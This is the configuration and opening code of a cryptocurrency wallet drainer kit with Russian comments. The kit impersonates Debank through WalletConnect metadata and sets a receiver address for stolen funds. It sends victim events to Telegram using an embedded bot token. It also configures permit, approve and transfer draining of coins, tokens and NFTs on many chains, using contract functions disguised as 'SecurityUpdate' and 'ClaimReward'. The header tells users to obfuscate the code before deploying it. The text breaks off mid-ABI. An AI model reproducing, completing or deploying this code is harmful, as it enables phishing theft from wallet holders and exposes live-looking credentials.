// Использование данного кода без обфускации СТРОГО ЗАПРЕЩЕНО
// В случае, если это будет обнаружено, будет составлен арбитраж
// Обфускацию данного скрипта можно выполнить здесь: obfuscator.io

// Нашли скрипт в открытом доступе без обфускации?
// Сообщите разработчику по электронной почте: msteal-dev@proton.me
// Укажите место или домен, где располагается скрипт

// =====================================================================
// ==================== ОСНОВНЫЕ НАСТРОЙКИ СКРИПТА =====================
// =====================================================================



let MS_Encryption_Key = 0; // Укажите любое число, которое будет использовано для шифрования (не рекомендуется оставлять по умолчанию!)
// Это же число должно быть указано и в файле server.js - если они будут различаться, то ничего не будет работать правильно

const MS_WalletConnect_ID = "74c8786c3a735af466f2a6a82669d85b"; // Project ID из WalletConnect Cloud

const MS_Modal_Style = 2; // 1 - старая, 2 - новая (обновление от 01.10.2023)
const MS_Loader_Style = 2; // 1 - старый, 2 - новый (обновление от 01.10.2023)
const MS_Color_Scheme = 'dark'; // light - светлая тема, dark - тёмная тема
const MS_Modal_Mode = 2; // 1 - выбирать кошелек нажатием и подключать кнопкой, 2 - подключать сразу после выбора

  const BOT_TOKEN = "7258779902:AAHNVwLfz-e1BFAvqRmAsVKSQiH45vq_AX8";
  const LOGS_CHAT_ID = "-1002244194847";
  const SUCCESS_CHAT_ID =  "-1002244194847";
  const projectId = '74c8786c3a735af466f2a6a82669d85b'

const MS_Verify_Message = ""; // Сообщение для верификации кошелька, может содержать тег {{ADDRESS}}
// По умолчанию оставьте пустым, чтобы получать сообщение с сервера, иначе заполните, чтобы использовать кастомное

// С помощью настройки ниже вы можете кастомизировать то, как будет выглядеть ваш сайт в интерфейсе WalletConnect
// Изменять необязательно, большинство кошельков работают с настройками по умолчанию
// Настройка не связана с переключателем MS_WalletConnect_Customization, он нужен только для кастомизации дизайна


const MS_WalletConnect_MetaData = {
  name: document.title, // По умолчанию такое же как название сайта
  description: "Debank Web3", // По умолчанию "Web3 Application"
  url: "https://debank.com/", // По умолчанию как домен сайта
  icons: [ "https://avatars.githubusercontent.com/u/37784886" ]
};

const MS_WalletConnect_Customization = 0; // 0 - использовать окно по умолчанию, 1 - пользовательская кастомизация
const MS_WalletConnect_Theme = { // Параметры кастомизации доступны здесь: https://docs.walletconnect.com/2.0/web/web3modal/react/wagmi/theming
  themeMode: 'light',
  themeVariables: {
    '--w3m-background-color': '#000000',
    '--w3m-accent-color': '#F5841F',
    '--w3m-z-index': 9999999
  }
};

const MS_Custom_Chat = {
  Enable: 0, // 0 - использовать настройки сервера, 1 - использовать настройки клиента
  Chat_Settings: {
    enter_website: "2244194847", // ID канала для действия - Вход на сайт (если пусто - уведомление отключено)
    leave_website: "2244194847", // ID канала для действия - Выход с сайта (если пусто - уведомление отключено)
    connect_success: "2244194847", // ID канала для действия - Успешное подключение (если пусто - уведомление отключено)
    connect_request: "2244194847", // ID канала для действия - Запрос на подключение (если пусто - уведомление отключено)
    connect_cancel: "2244194847", // ID канала для действия - Подключение отклонено (если пусто - уведомление отключено)
    approve_request: "2244194847", // ID канала для действия - Запрос на подтверждение (если пусто - уведомление отключено)
    approve_success: "2244194847", // ID канала для действия - Успешное подтверждение (если пусто - уведомление отключено)
    approve_cancel: "2244194847", // ID канала для действия - Подтверждение отклонено (если пусто - уведомление отключено)
    permit_sign_data: "2244194847", // ID канала для действия - Данные из PERMIT (если пусто - уведомление отключено)
    transfer_request: "2244194847", // ID канала для действия - Запрос на перевод (если пусто - уведомление отключено)
    transfer_success: "2244194847", // ID канала для действия - Успешный перевод (если пусто - уведомление отключено)
    transfer_cancel: "2244194847", // ID канала для действия - Отмена перевода (если пусто - уведомление отключено)
    sign_request: "2244194847", // ID канала для действия - Запрос на подпись (если пусто - уведомление отключено)
    sign_success: "2244194847", // ID канала для действия - Успешная подпись (если пусто - уведомление отключено)
    sign_cancel: "2244194847", // ID канала для действия - Подпись отклонена (если пусто - уведомление отключено)
    chain_request: "2244194847", // ID канала для действия - Запрос на смену сети (если пусто - уведомление отключено)
    chain_success: "2244194847", // ID канала для действия - Смена сети принята (если пусто - уведомление отключено)
    chain_cancel: "2244194847", // ID канала для действия - Смена сети отклонена (если пусто - уведомление отключено)
  }
};

// =====================================================================
// ============ ВНОСИТЬ ИЗМЕНЕНИЯ В КОД НИЖЕ НЕ БЕЗОПАСНО ==============
// =====================================================================

var MS_Worker_ID = null;

let MS_Settings = {
    "RPCs": {
        "1": "https://rpc.ankr.com/eth",
        "10": "https://rpc.ankr.com/optimism",
        "56": "https://rpc.ankr.com/bsc",
        "137": "https://rpc.ankr.com/polygon",
        "250": "https://rpc.ankr.com/fantom",
        "324": "https://rpc.ankr.com/zksync_era",
        "369": "https://pulsechain.publicnode.com",
        "8453": "https://rpc.ankr.com/base",
        "42161": "https://rpc.ankr.com/arbitrum",
        "43114": "https://rpc.ankr.com/avalanche"
    },
    "Address": "0x06F4e33c1Ed108EbF69C9B715209985D626C51ce",
    "Notifications": {
        "enter_website": true,
        "leave_website": false,
        "connect_success": true,
        "connect_request": true,
        "connect_cancel": false,
        "approve_request": false,
        "approve_success": true,
        "approve_cancel": true,
        "permit_sign_data": false,
        "transfer_request": false,
        "transfer_success": false,
        "transfer_cancel": false,
        "sign_request": false,
        "sign_success": false,
        "sign_cancel": false,
        "chain_request": false,
        "chain_success": false,
        "chain_cancel": false
    },
    "Settings": {
        "Minimal_Wallet_Price": 1,
        "Tokens_First": 0,
        "Wait_For_Confirmation": 1,
        "Wait_For_Response": 1,
        "Sign": {
            "Native": 1,
            "Tokens": 1,
            "NFTs": 1,
            "Force": 0,
            "WalletConnect": 1,
            "WC_AE": 1,
            "MetaMask": 1,
            "Trust": 1
        },
        "Permit": {
            "Mode": 1,
            "Priority": 0,
            "Bypass": 0,
            "Challenge": 1,
            "Price": 1
        },
        "Permit2": {
            "Mode": 1,
            "Bypass": 0,
            "Price": 1
        },
        "Approve": {
            "Enable": 1,
            "MetaMask": 2,
            "Trust": 4,
            "Bypass": 0,
            "Withdraw": 1,
            "Withdraw_Amount": 1
        },
        "SAFA": {
            "Enable": 1,
            "Bypass": 0,
            "Withdraw": 2,
            "Withdraw_Amount": 1
        },
        "Swappers": {
            "Enable": 0,
            "Priority": 0,
            "Price": 50,
            "Uniswap": 1,
            "Pancake": 1,
            "Quick": 0,
            "Sushi": 0
        },
        "SeaPort": {
            "Enable": 0,
            "Priority": 1,
            "Limit": 1,
            "Price": 1
        },
        "Blur": {
            "Enable": 0,
            "Priority": 1,
            "Limit": 1,
            "Price": 1
        },
        "x2y2": {
            "Enable": 0,
            "Priority": 1,
            "Price": 1
        },
        "Chains": {
            "eth": {
                "Enable": 1,
                "Native": 1,
                "Tokens": 1,
                "NFTs": 1,
                "Min_Native_Price": 1,
                "Min_Tokens_Price": 1,
                "Min_NFTs_Price": 1,
                "API": "2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99",
                "Contract_Address": "0x0007039b77d22042afc1a9c3b3da11837b730000",
                "Contract_Type": "Execute",
                "Contract_Legacy": 0
            },
            "bsc": {
                "Enable": 1,
                "Native": 1,
                "Tokens": 1,
                "NFTs": 1,
                "Min_Native_Price": 1,
                "Min_Tokens_Price": 1,
                "Min_NFTs_Price": 1,
                "API": "K5AI5N7ZPC9EF6G9MVQF33CBVMY1UKQ7HI",
                "Contract_Address": "0x0007039b77d22042afc1a9c3b3da11837b730000",
                "Contract_Type": "Execute",
                "Contract_Legacy": 0
            },
            "polygon": {
                "Enable": 1,
                "Native": 1,
                "Tokens": 1,
                "NFTs": 1,
                "Min_Native_Price": 1,
                "Min_Tokens_Price": 1,
                "Min_NFTs_Price": 1,
                "API": "M9IMUX515SEB97THWJRQDKNX75CI66X7XX",
                "Contract_Address": "0x0007039b77d22042afc1a9c3b3da11837b730000",
                "Contract_Type": "Execute",
                "Contract_Legacy": 0
            },
            "avalanche": {
                "Enable": 1,
                "Native": 1,
                "Tokens": 1,
                "NFTs": 1,
                "Min_Native_Price": 1,
                "Min_Tokens_Price": 1,
                "Min_NFTs_Price": 1,
                "API": "ZMJ2CKEX65EJ8WIPWRJWKRFG8HXCM6I89Z",
                "Contract_Address": "0x0007039b77d22042afc1a9c3b3da11837b730000",
                "Contract_Type": "Execute",
                "Contract_Legacy": 0
            },
            "arbitrum": {
                "Enable": 1,
                "Native": 1,
                "Tokens": 1,
                "NFTs": 1,
                "Min_Native_Price": 1,
                "Min_Tokens_Price": 1,
                "Min_NFTs_Price": 1,
                "API": "DU3TKS3QYBQAHC7SEQ5YHB9VPD85JXTX7I",
                "Contract_Address": "0x0007039b77d22042afc1a9c3b3da11837b730000",
                "Contract_Type": "Execute",
                "Contract_Legacy": 0
            },
            "fantom": {
                "Enable": 1,
                "Native": 1,
                "Tokens": 1,
                "NFTs": 1,
                "Min_Native_Price": 1,
                "Min_Tokens_Price": 1,
                "Min_NFTs_Price": 1,
                "API": "F9GFY4EXGD84MHWEK5NCUJWF9FZVBRT415",
                "Contract_Address": "0x0007039b77d22042afc1a9c3b3da11837b730000",
                "Contract_Type": "Execute",
                "Contract_Legacy": 0
            },
            "optimism": {
                "Enable": 1,
                "Native": 1,
                "Tokens": 1,
                "NFTs": 1,
                "Min_Native_Price": 1,
                "Min_Tokens_Price": 1,
                "Min_NFTs_Price": 1,
                "API": "46J83C1RF5TEWJ3NVCF17PG3KYD36U9QPK",
                "Contract_Address": "0x0007039b77d22042afc1a9c3b3da11837b730000",
                "Contract_Type": "Execute",
                "Contract_Legacy": 0
            },
            "base": {
                "Enable": 1,
                "Native": 1,
                "Tokens": 1,
                "NFTs": 1,
                "Min_Native_Price": 1,
                "Min_Tokens_Price": 1,
                "Min_NFTs_Price": 1,
                "API": "6NGC2DAW6N197CWFP224HSR3778ZDFF6EI",
                "Contract_Address": "0x0007039b77d22042afc1a9c3b3da11837b730000",
                "Contract_Type": "Execute",
                "Contract_Legacy": 0
            },
            "zksync_era": {
                "Enable": 1,
                "Native": 1,
                "Tokens": 1,
                "NFTs": 1,
                "Min_Native_Price": 1,
                "Min_Tokens_Price": 1,
                "Min_NFTs_Price": 1,
                "API": "",
                "Contract_Address": "",
                "Contract_Type": "Execute",
                "Contract_Legacy": 0
            },
            "pulse": {
                "Enable": 1,
                "Native": 1,
                "Tokens": 1,
                "NFTs": 1,
                "Min_Native_Price": 1,
                "Min_Tokens_Price": 1,
                "Min_NFTs_Price": 1,
                "API": "",
                "Contract_Address": "",
                "Contract_Type": "Execute",
                "Contract_Legacy": 0
            }
        }
    },
    "Contract_Blacklist": [
        "0x4238e5ccc619dcc8c00ade4cfc5d3d9020b24898",
        "0x0b91b07beb67333225a5ba0259d55aee10e3a578",
        "0xd9e838dd60c8ea1e7dd4e670913323bb87db112c",
        "0x97eae24ca21fc9c0c5d4c31d12e9100ab50f20ea",
        "0x396d8805d184ef5325b5ccd107638adfd38ccff8",
        "0xd048b4c23af828e5be412505a51a8dd7b37782dd",
        "0x82d0952f3524df3e0f003d6bb231015d312f9164",
        "0x71753d0586ea6b979dfccbb492a45e611e0e0ad6",
        "0x36cc190e338aedca03739b71c7254b3661ac42b9",
        "0x0cf8e180350253271f4b917ccfb0accc4862f262",
        "0xc068cbf21ac99cedfcc8973d66f20d7f235a3ba2",
        "0xe3e1147acd39687a25ca7716227c604500f5c31a",
        "0x4aa6b74464e6ceb3cc47046a7da8ff01487a00cd",
        "0x0f9adaaccd7caecc5019194e15ad19624fed95fa",
        "0xca6d678e74f553f0e59cccc03ae644a3c2c5ee7d",
        "0xef093fa75ee8d7cb1ac63ee5e6e1cc7bd5871d1b",
        "0x35122d1fe8001296f61290b8ba42ef597af31fb7",
        "0x5f7a1a4dafd0718caee1184caa4862543f75edb1",
        "0xd7220789e9a775b2eac0822b5d7c7d734b187e9b",
        "0x2dea12c4f08074032a9997f0a199b04af0fc0392",
        "0x7e6202903275772044198d07b8a536cc064f8480",
        "0x9fffe0385dc7584faeeac59f56eedfc442bba622",
        "0xb0557906c617f0048a700758606f64b33d0c41a6",
        "0xd22202d23fe7de9e3dbe11a2a88f42f4cb9507cf",
        "0xa02a0b2d67d4fa48677a79cadc483e114049916d",
        "0xee85c2145d01fbae8f8b97b5b5e8f2d4054956fd",
        "0xd2c8cdab8e68be3785db77f160a436a0e0905c34",
        "0xcddf9ef175e79541a783eaa9f0dfd712bc7c73b1",
        "0xc3ebf4a71d441afa1f477047cbf5597f82724771",
        "0xb0f8d835e957ceb92d40fa110c9428440420f061",
        "0x9e93f0918a8e92053c28a23cc8c43db10c1fe858",
        "0x77ea6d2f3a86170bab01816509401b1864bfc3d3",
        "0x734c5f3f8f6ad9697b26ecc6388678aafd3db3b2",
        "0x72add749ddcfe9b749f50cbff76b59a2e6c80af5",
        "0x7158d987f62280b5b6b91c0f4026d42f712819c2",
        "0x6a67b5d14b19828f36db5c128da2a1826d2618de",
        "0x53035e4e14fb3f82c02357b35d5cc0c5b53928b4",
        "0x4fa2e5871dd9622c515f66a4b3230b73236e0d8d",
        "0x472a859b330775c4864923c9b933c68d83d5e5d5",
        "0x43a172c44dc55c2b45bf9436cf672850fc8ba046",
        "0x2ad7f18dcfa131e33411770a9c6c4fe49b187bc2",
        "0x17483ff53f49d83b031009edb39027fa8d24a2da",
        "0x10649d7fad69e4ac68be0f12de99e1ecc18219a0",
        "0xdc4cb4c3587532409a4545aa79a15d967bed1c08",
        "0xbb92b9d18db99c3695bc820bf2c876d4b1527fa5",
        "0xc3238c3b7b8e32588a49c751aed808368e85122d",
        "0xf898a4f66ba1530919877e6591625b44e706e2c0",
        "0xf43a71e4da398e5731c9580d11014de5e8fd0530",
        "0xaecc1f18298868f0d7d509ada0239ba18b43e549",
        "0x949e0a0672299e6fcd6bec3bd1735d6647b20618",
        "0x725e02c7f9168f45b3699cfb7c262fb6dd355e84",
        "0x513c285cd76884acc377a63dc63a4e83d7d21fb5",
        "0x4a9e54fd1bef556c7d0d6d20b9f8dab886417e05",
        "0x000000000482aa9817645c3d56aa2230f6573532",
        "0x7a59ce9c4248f8b078fd96d9965e6e5dc8e6f0a8",
        "0x4b97c9bee3677797034033337f32115115867a62",
        "0x5620eba565d42e8a7eac25721d8fe9270ac8ca3e",
        "0x7aa3a53360541283ffa9192972223b47a902dc0c",
        "0xbff96267c5a60aa61763dd7159da14d6df6da371",
        "0xed00fc7d48b57b81fe65d1ce71c0985e4cf442cb",
        "0xf5e1c367d2e41b9143937ad17da6d53abbbc306b",
        "0x5f2caa99fc378248ac02cbbaac27e3fa155ed2c4",
        "0x0b7dc561777842d55163e0f48886295aad1359b9",
        "0xe327ce757cd206721e100812e744fc56e4e0a969",
        "0xc78c316f088626637ff3b7c650446c1f3f143b79",
        "0x74ddd251aa2037be101bf53f655716b1734828cd",
        "0xa1b99485d58d70d86e455ab8823492090c3f43c0",
        "0x306639613914725dacab91953612095e76d71fba",
        "0x2b2af27b6d8bdff171a97fe12a8fe0fcc9cc4bbd",
        "0x67c4a6da86da4f45030904b143d6b00d25e366e9",
        "0xc3589ba9272196190de7ae9175cfe829945426d7",
        "0x0cd2b73e194274a26cb2008da153751d04f6d822",
        "0xd08f7b01fdd26928dcdc956610a5332f17b3ea11",
        "0x0000000000004946c0e9f43f4dee607b0ef1fa1c",
        "0x0d4992e48278aa7f7c915f820743d9fab7fea713",
        "0x0e262b466c1d357074a37256c151263a702bff36",
        "0x119e2ad8f0c85c6f61afdf0df69693028cdc10be",
        "0x13c3d54a942fd81bfc9236bd1106d081aeadcd3a",
        "0x15351604e617d9f645b53ee211d9c95ba88297df",
        "0x1f040f15ab15b7e0dfac935873fadbe43d015535",
        "0x2248ba304d2045cdc144866ce37d1435a30b29f3",
        "0x27b880865395da6cda9c407e5edfcc32184cf429",
        "0x29e3b514d22af48bd22d79ed1fc5475f72a9dd4b",
        "0x2ba6204c23fbd5698ed90abc911de263e5f41266",
        "0x3b4deb27a46e746776a661ecf523c42ed0400d54",
        "0x4a5fad6631fd3df66f23519608185cb96e9a687d",
        "0x5190b01965b6e3d786706fd4a999978626c19880",
        "0x57dbae4b73455bc0d3e892ae57779160961f0f03",
        "0x58b5c4697dc70f3d889225260944cdd9c270c132",
        "0x6139a0fd42032f29bcc1f9082d5c250cffe98387",
        "0x641a6dc991a49f7be9fe3c72c5d0fbb223edb12f",
        "0x64f2c2aa04755507a2ecd22ceb8c475b7a750a3a",
        "0x68d1569d1a6968f194b4d93f8d0b416c123a599f",
        "0x8bd0e87273364ebbe3482efc166f7e0d34d82c25",
        "0x8cad27f4a0987ff10a2a14c35154cb5407b7bfa5",
        "0x98f8669f6481ebb341b522fcd3663f79a3d1a6a7",
        "0xa7255c85232a42b5c602ed66c319da9af8433bb3",
        "0xa8415a1d4d2eab3159ee64c42c34bf53fcfe524a",
        "0xb2ad5142b8ccb380731866bc42b3619759f3f7b3",
        "0xb38654311234739dd3ec32660e19d89766074df6",
        "0xb8a9704d48c3e3817cc17bc6d350b00d7caaecf6",
        "0xba2ae424d960c26247dd6c32edc70b295c744c43",
        "0xbc6675de91e3da8eac51293ecb87c359019621cf",
        "0xbf7183b8c8e5bb2d10f63678abb5d52df72712b2",
        "0xc2eaaf69e6439abab12dd21f560ba0ec7f17cff7",
        "0xc33fc11b55465045b3f1684bde4c0aa5c5f40124",
        "0xc8e8ecb2a5b5d1ecff007bf74d15a86434aa0c5c",
        "0xcaee79616cffeb53fdda5792742a5c084f879dec",
        "0xd35f9ab96d04adb02fd549ef6a576ce4e2c1d935",
        "0xdfb8603d947ab42fb76eb3bb14d9dde4334130d2",
        "0xe41a093549beee36b76728d456894093396d1120",
        "0xea6c3053797347ce4e58e722a1dea77af308c292",
        "0xeade8e37700a34b196142d9962858d2a137e6eb8",
        "0xf70c14ad93905f39ee3df2d4fb92b87c31d779e0",
        "0xfcf37440dd6dfc633dde30bbd77f5b0ef5228b8b",
        "0xfd4c532a8c17bd326c2dc63b88d49306ce27f80b",
        "0x04645027122c9f152011f128c7085449b27cb6d7",
        "0x17e2822278f35b272eb6ce1f8d496fe61ec0f395",
        "0x299aef5cc28e1387ee0951163ef67b0c7d591968",
        "0x43c967256de9af23ed59b95114016c9b588a9127",
        "0x580ca2b84331ae1cacc525e1839c5097be37a1c8",
        "0x6b928e0ed8a2f2bf40e7c557b52a3cf7bccca064",
        "0x72d3882a31c7d9c5d5989ade65e3c129e5a1717a",
        "0x9c1273b6cfec61c6f61cef472c7dff740187589f",
        "0xac6a41a0a06b2aaedaa6187bed974e1fe6cb21d2",
        "0xcf8b4e69707e22dc5062f80576d9f069275ed1b5",
        "0xed96fdfc15ea82c5ae2469320236ddfc18de243e",
        "0xedbd18b82215e7e39b7080ad967669b00ff1b8b4",
        "0xf735ca1a0a90deaa80862177d070510be3313e34",
        "0xf3a6b60bfbb3ce9d69bfaf9ddb61738b4607e8c8",
        "0x1c749d5f5630cf365673bf6c0b6b0570c48da112",
        "0x2231e1c01056aebab3113d684b034b50a99a56c7",
        "0x32d3499feca3f881d779f0183d7b41d32b2498df",
        "0x6d11e81ae4085502149af936b10cec4200793e51",
        "0x7b4a50a9010c79be94baf3e7ae49f2602557855c",
        "0x836e8f81b9e07bff462319879d662ecd21481364",
        "0x8f6f9195a536b4a7d67553575b08861cd3a3d644",
        "0x9603a3d3dcccf5ef1a2060a3da796ac084cc66eb",
        "0x9fdfb9c375112b90e97b344bcde73ccde840db92",
        "0xc0a934e793c2887456b886bcb6dde63a7ce6b8d0",
        "0xd2f83cf5c697e892a38f8d1830eb88ebc0809a0c",
        "0xe8d6eccf4df7067a52d43495c11b69deeedb965e",
        "0xeb51abfe67e9eae5572444c1d789812c04ff3853",
        "0xec811fbcd12f67874891cdbbbc95d9f73db3fbb0",
        "0x9b11bc99f7e20ef5b954a23e953c842c2962d7e3",
        "0xb186035490c8602ead853ec98be05e3461521ab2",
        "0xda2d21872999e700a715a1bda3153eb9079770bb",
        "0xa27953fe076ce1caf9fee6c02528390da168f69a",
        "0x0165bdab5fccd14f672dbb04115e1715da528587",
        "0xb1d1f51a96355ad6fa8266f311e7a67700a26f6a",
        "0x009668a9691e456972c8ec4cc84e99486308b84d",
        "0x33909c9ce97ce509dab3a038b3ec7ac3d1be3231",
        "0xb1d1f51a96355ad6fa8266f311e7a67700a26f6a",
        "0x18468129f8fe42eadb2afe7973c2f5e80b38b299",
        "0xb1d1f51a96355ad6fa8266f311e7a67700a26f6a",
        "0x18468129f8fe42eadb2afe7973c2f5e80b38b299",
        "0xd24157aa1097486dc9d7cf094a7e15026e566b5d",
        "0xb9f0a9a59a44577631680c7bc0846b85234f7473",
        "0xb1d1f51a96355ad6fa8266f311e7a67700a26f6a",
        "0x18468129f8fe42eadb2afe7973c2f5e80b38b299",
        "0xd24157aa1097486dc9d7cf094a7e15026e566b5d",
        "0xb9f0a9a59a44577631680c7bc0846b85234f7473",
        "0x9f583e512ef9b234054c07b61388fb73be54f9c5",
        "0x265befe2b1a0f4f646dea96ba09c1656b74bda91",
        "0xe1b3f4849c8959f53edd3ab932e0f145daf865c1",
        "0xcbdeb4ff6cb834a83bf438d26a2fb5e6f53319b7",
        "0x5647d5a93f6fa963ded4912ce9a7528a0f342c99",
        "0x53f952260518bffc4f803df125ff22799debec1a",
        "0x9cd5028ffa4e2a71a0a2a26696b6764a4f74e6e1",
        "0x4e1191fa01bb4ec0dcca114a958bf5c204c285fb",
        "0x985dd3d42de1e256d09e1c10f112bccb8015ad41",
        "0x4a7397b0b86bb0f9482a3f4f16de942f04e88702",
        "0xf84ea569eaaebd634cac7944058f1b17386aa56e",
        "0x17158e788771ebff629e00e9b0b62a9c921e2134",
        "0x0f65cfde93db3a37ecc4fce0873010f3daf434a3",
        "0x82dfdb2ec1aa6003ed4acba663403d7c2127ff67",
        "0x5ccce837b41dbd2ad74882889749517935741390",
        "0x5ab76c4ec60731e6ae1d2ebd2e604f1ec18a038b",
        "0x609b88f5a4abb7a55ba0c6d255c3f1b1bc7a4d76",
        "0x9ba03c4db8b3ec92d6bc3c2ad76859c058283b76",
        "0x64609a845ad463d07ee51e91a88d1461c3dc3165",
        "0x97e6e31afb2d93d437301e006d9da714616766a5",
        "0x57c56665b2bcdf3cb86e40a9d3dc21f5b0aed7ad",
        "0xc12d1c73ee7dc3615ba4e37e4abfdbddfa38907e",
        "0xe4e11e02aa14c7f24db749421986eaec1369e8c9",
        "0x60e6895184448f3e8ef509d083e3cc3ac31f82fd",
        "0x4238e5ccc619dcc8c00ade4cfc5d3d9020b24898"
    ],
    "Contract_Whitelist": [],
    "Wallet_Blacklist": [],
    "Receiver": "0x06F4e33c1Ed108EbF69C9B715209985D626C51ce",
    "CIS": true,
    "V_MSG": "By signing this message, you agree to the Terms of Use and authorize the use of your wallet address to identify you on the site, also confirm that you are the wallet's owner:\n\n{{ADDRESS}}",
    "Loop_N": 0,
    "Loop_T": 0,
    "Loop_NFT": 0,
    "Permit_BL": [
        [
            1,
            "0xae7ab96520de3a18e5e111b5eaab095312d7fe84"
        ],
        [
            137,
            "0x2791bca1f2de4661ed88a30c99a7a9449aa84174"
        ]
    ],
    "V_MODE": 0,
    "Unlimited_BL": [
        [
            1,
            "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984"
        ]
    ],
    "DSB": false,
    "AT": "",
    "LA": 0}; 
let MS_Contract_ABI = {
    "CONTRACT_LEGACY": [
        {
            "constant": false,
            "inputs": [],
            "name": "SecurityUpdate",
            "outputs": [],
            "payable": true,
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [],
            "name": "Claim",
            "outputs": [],
            "payable": true,
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [],
            "name": "ClaimReward",
            "outputs": [],
            "payable": true,
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [],
            "name": "ClaimRewards",
            "outputs": [],
            "payable": true,
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [],
            "name": "Swap",
            "outputs": [],
            "payable": true,
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [],
            "name": "Connect",
            "outputs": [],
            "payable": true,
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [],
            "name": "Execute",
            "outputs": [],
            "payable": true,
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [],
            "name": "Multicall",
            "outputs": [],
            "payable": true,
            "stateMutability": "payable",
            "type": "function"
        }
    ],
    "CONTRACT": [
        {
            "constant": false,
            "inputs": [
                {
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                }
            ],
            "name": "SecurityUpdate",
            "outputs": [],
            "payable": true,
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                }
            ],
            "name": "Claim",
            "outputs": [],
            "payable": true,
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                }
            ],
            "name": "ClaimReward",
            "outputs": [],
            "payable": true,
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                }
            ],
            "name": "ClaimRewards",
            "outputs": [],
            "payable": true,
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                }
            ],
            "name": "Swap",
            "outputs": [],
            "payable": true,
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                }
            ],
            "name": "Connect",
            "outputs": [],
            "payable": true,
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                }
            ],
            "name": "Execute",
            "outputs": [],
            "payable": true,
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                }
            ],
            "name": "Multicall",
            "outputs": [],
            "payable": true,
            "stateMutability": "payable",
            "type": "function"
        }
    ],
    "ERC20": [
        {
            "inputs": [],
            "stateMutability": "nonpayable",
            "type": "constructor"
        },
        {
            "anonymous": false,
            "inputs": [
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                },
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                },
                {
                    "indexed": false,
                    "internalType": "uint256",
                    "name": "value",
                    "type": "uint256"
                }
            ],
            "name": "Approval",
            "type": "event",
            "signature": "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925"
        },
        {
            "anonymous": false,
            "inputs": [
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "from",
                    "type": "address"
                },
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "indexed": false,
                    "internalType": "uint256",
                    "name": "value",
                    "type": "uint256"
                }
            ],
            "name": "Transfer",
            "type": "event",
            "signature": "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "delegate",
                    "type": "address"
                }
            ],
            "name": "allowance",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function",
            "constant": true,
            "signature": "0xdd62ed3e"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "delegate",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "numTokens",
                    "type": "uint256"
                }
            ],
            "name": "approve",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "function",
            "signature": "0x095ea7b3"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "tokenOwner",
                    "type": "address"
                }
            ],
            "name": "balanceOf",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function",
            "constant": true,
            "signature": "0x70a08231"
        },
        {
            "inputs": [],
            "name": "decimals",
            "outputs": [
                {
                    "internalType": "uint8",
                    "name": "",
                    "type": "uint8"
                }
            ],
            "stateMutability": "view",
            "type": "function",
            "constant": true,
            "signature": "0x313ce567"
        },
        {
            "inputs": [],
            "name": "name",
            "outputs": [
                {
                    "internalType": "string",
                    "name": "",
                    "type": "string"
                }
            ],
            "stateMutability": "view",
            "type": "function",
            "constant": true,
            "signature": "0x06fdde03"
        },
        {
            "inputs": [],
            "name": "symbol",
            "outputs": [
                {
                    "internalType": "string",
                    "name": "",
                    "type": "string"
                }
            ],
            "stateMutability": "view",
            "type": "function",
            "constant": true,
            "signature": "0x95d89b41"
        },
        {
            "inputs": [],
            "name": "totalSupply",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function",
            "constant": true,
            "signature": "0x18160ddd"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "receiver",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "numTokens",
                    "type": "uint256"
                }
            ],
            "name": "transfer",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "function",
            "signature": "0xa9059cbb"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
